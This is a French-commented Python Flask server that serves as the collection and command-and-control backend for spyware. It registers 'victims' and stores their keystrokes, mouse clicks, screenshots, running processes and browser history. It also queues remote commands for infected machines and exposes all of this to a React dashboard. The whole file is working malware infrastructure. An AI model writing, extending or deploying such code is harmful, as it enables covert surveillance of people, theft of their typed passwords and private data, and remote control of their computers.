import os
import json
import base64
from datetime import datetime
from io import BytesIO
from PIL import Image

from flask import Flask, request, jsonify, send_from_directory
from flask_cors import CORS
import sqlite3

# --- Configuration de l'App ---
app = Flask(__name__)
CORS(app)  # Essentiel pour que React (port 3000) puisse communiquer avec Flask (port 5000)

# Configuration des chemins
DATABASE = 'database.db'  # Le fichier de la base de données sera créé ici
UPLOAD_FOLDER = 'static/uploads'
app.config['UPLOAD_FOLDER'] = UPLOAD_FOLDER

# Créer les dossiers nécessaires s'ils n'existent pas
os.makedirs(os.path.dirname(DATABASE), exist_ok=True)
os.makedirs(UPLOAD_FOLDER, exist_ok=True)

# --- Fonctions Utilitaires pour la Base de Données ---

def get_db_connection():
    """Établit une connexion à la base de données SQLite."""
    conn = sqlite3.connect(DATABASE)
    conn.row_factory = sqlite3.Row  # Permet d'accéder aux colonnes par leur nom
    return conn

def init_db():
    """Initialise la base de données avec le schéma."""
    with app.app_context():
        db = get_db_connection()
        with app.open_resource('schema.sql', mode='r') as f:
            db.cursor().executescript(f.read())
        db.commit()

# --- API Endpoints pour le Frontend React ---

@app.route('/api/victims', methods=['GET'])
def get_all_victims():
    """Retourne la liste de toutes les victimes et des statistiques générales."""
    conn = get_db_connection()
    victims = conn.execute('SELECT * FROM victims ORDER BY last_seen DESC').fetchall()
    
    stats = {
        'total_victims': len(victims),
        'active_victims': len([v for v in victims if v['status'] == 'active']),
        'total_keystrokes': conn.execute('SELECT SUM(LENGTH(keystrokes)) FROM logs').fetchone()[0] or 0,
        'total_screenshots': conn.execute('SELECT COUNT(*) FROM screenshots').fetchone()[0]
    }
    
    # Convertir les objets Row en dictionnaires pour la sérialisation JSON
    victims_list = [dict(v) for v in victims]
    conn.close()
    return jsonify({'victims': victims_list, 'stats': stats})

@app.route('/api/victims/<victim_id>', methods=['GET'])
def get_victim_details(victim_id):
    """Retourne tous les détails pour une victime spécifique."""
    conn = get_db_connection()
    victim = conn.execute('SELECT * FROM victims WHERE id = ?', (victim_id,)).fetchone()
    
    if not victim:
        return jsonify({"error": "Victim not found"}), 404

    # Récupérer toutes les données associées à la victime
    logs = conn.execute('SELECT * FROM logs WHERE victim_id = ? ORDER BY timestamp DESC LIMIT 50', (victim_id,)).fetchall()
    screenshots = conn.execute('SELECT * FROM screenshots WHERE victim_id = ? ORDER BY timestamp DESC LIMIT 10', (victim_id,)).fetchall()
    mouse_clicks = conn.execute('SELECT * FROM mouse_clicks WHERE victim_id = ? ORDER BY timestamp DESC LIMIT 50', (victim_id,)).fetchall()
    active_windows = conn.execute('SELECT * FROM active_windows WHERE victim_id = ? ORDER BY timestamp DESC LIMIT 30', (victim_id,)).fetchall()
    processes = conn.execute('SELECT * FROM processes WHERE victim_id = ? ORDER BY timestamp DESC LIMIT 1', (victim_id,)).fetchall()
    browser_history = conn.execute('SELECT * FROM browser_history WHERE victim_id = ? ORDER BY timestamp DESC LIMIT 20', (victim_id,)).fetchall()

    conn.close()
    
    return jsonify({
        'victim': dict(victim),
        'logs': [dict(l) for l in logs],
        'screenshots': [dict(s) for s in screenshots],
        'mouse_clicks': [dict(m) for m in mouse_clicks],
        'active_windows': [dict(w) for w in active_windows],
        'processes': [dict(p) for p in processes],
        'browser_history': [dict(b) for b in browser_history]
    })

@app.route('/api/command', methods=['POST'])
def send_command():
    """Reçoit une commande à envoyer à une victime depuis le frontend."""
    data = request.json
    victim_id = data.get('victim_id')
    command = data.get('command')
    
    if not victim_id or not command:
        return jsonify({"status": "error", "message": "Missing parameters"}), 400

    conn = get_db_connection()
    conn.execute(
        'INSERT INTO commands (victim_id, command, timestamp) VALUES (?, ?, ?)',
        (victim_id, command, datetime.now().strftime('%Y-%m-%d %H:%M:%S'))
    )
    conn.commit()
    conn.close()
    return jsonify({"status": "success", "message": "Command queued"})

# --- API Endpoints pour le Script de la Victime ---

@app.route('/api/init', methods=['POST'])
def register_victim():
    """Enregistre une nouvelle victime ou met à jour une victime existante."""
    data = request.json
    victim_id = data.get('victim_id')
    if not victim_id:
        return jsonify({"status": "error", "message": "Missing victim_id"}), 400

    conn = get_db_connection()
    existing_victim = conn.execute('SELECT id FROM victims WHERE id = ?', (victim_id,)).fetchone()

    system_info = json.dumps(data.get('system_info', {}))
    network_info = json.dumps(data.get('network_info', {}))
    timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')

    if existing_victim:
        # Mettre à jour la victime existante
        conn.execute('UPDATE victims SET system_info = ?, network_info = ?, last_seen = ?, status = ? WHERE id = ?',
                     (system_info, network_info, timestamp, 'active', victim_id))
    else:
        # Créer une nouvelle victime
        conn.execute('INSERT INTO victims (id, system_info, network_info, first_seen, last_seen, status) VALUES (?, ?, ?, ?, ?, ?)',
                     (victim_id, system_info, network_info, timestamp, timestamp, 'active'))

    # Enregistrer les données initiales (processus, historique)
    for process in data.get('processes', []):
        conn.execute('INSERT INTO processes (victim_id, pid, name, username, timestamp) VALUES (?, ?, ?, ?, ?)',
                     (victim_id, process.get('pid'), process.get('name'), process.get('username'), timestamp))
    
    for entry in data.get('browser_history', []):
        conn.execute('INSERT INTO browser_history (victim_id, url, title, timestamp) VALUES (?, ?, ?, ?)',
                     (victim_id, entry.get('url'), entry.get('title'), entry.get('timestamp')))

    conn.commit()
    conn.close()
    return jsonify({"status": "success", "message": "Victim registered/updated"})

@app.route('/api/data', methods=['POST'])
def receive_data():
    """Reçoit les données périodiques (frappes, clics, etc.) de la victime."""
    data = request.json
    victim_id = data.get('victim_id')
    if not victim_id:
        return jsonify({"status": "error", "message": "Missing victim_id"}), 400

    conn = get_db_connection()
    log_data = data.get('data', {})
    timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')

    # Mettre à jour le statut de la victime comme 'active'
    conn.execute('UPDATE victims SET last_seen = ?, status = ? WHERE id = ?', (timestamp, 'active', victim_id))

    # Enregistrer les frappes
    keystrokes = log_data.get('keystrokes', '')
    if keystrokes:
        conn.execute('INSERT INTO logs (victim_id, keystrokes, timestamp) VALUES (?, ?, ?)', (victim_id, keystrokes, timestamp))

    # Enregistrer les clics de souris
    for click in log_data.get('mouse_clicks', []):
        conn.execute('INSERT INTO mouse_clicks (victim_id, x, y, button, window, timestamp) VALUES (?, ?, ?, ?, ?, ?)',
                     (victim_id, click.get('x'), click.get('y'), click.get('button'), click.get('window'), click.get('timestamp')))

    # Enregistrer les captures d'écran
    for screenshot in log_data.get('screenshots', []):
        try:
            # Décoder l'image base64
            img_data = base64.b64decode(screenshot.get('image'))
            img = Image.open(BytesIO(img_data))
            
            # Sauvegarder l'image avec un nom de fichier unique
            filename = f"{victim_id}_{screenshot.get('timestamp').replace(':', '-')}.jpg"
            filepath = os.path.join(app.config['UPLOAD_FOLDER'], filename)
            img.save(filepath, "JPEG")
            
            # Enregistrer le nom du fichier dans la base de données
            conn.execute('INSERT INTO screenshots (victim_id, filename, timestamp) VALUES (?, ?, ?)',
                         (victim_id, filename, screenshot.get('timestamp')))
        except Exception as e:
            print(f"Error processing screenshot: {e}")

    conn.commit()
    conn.close()
    return jsonify({"status": "success", "message": "Data received"})

# --- Servir les Fichiers Statiques (Captures d'Écran) ---

@app.route('/static/uploads/<filename>')
def get_uploaded_file(filename):
    """Permet au frontend d'afficher les images uploadées."""
    return send_from_directory(app.config['UPLOAD_FOLDER'], filename)

# --- Point d'Entrée de l'Application ---

if __name__ == '__main__':
    # Créer la base de données si elle n'existe pas
    if not os.path.exists(DATABASE):
        init_db()
        print("Database initialized.")
    
    # Démarrer le serveur Flask
    # host='0.0.0.0' le rend accessible depuis d'autres machines sur le réseau (comme votre VM)
    app.run(host='0.0.0.0', port=5000, debug=True)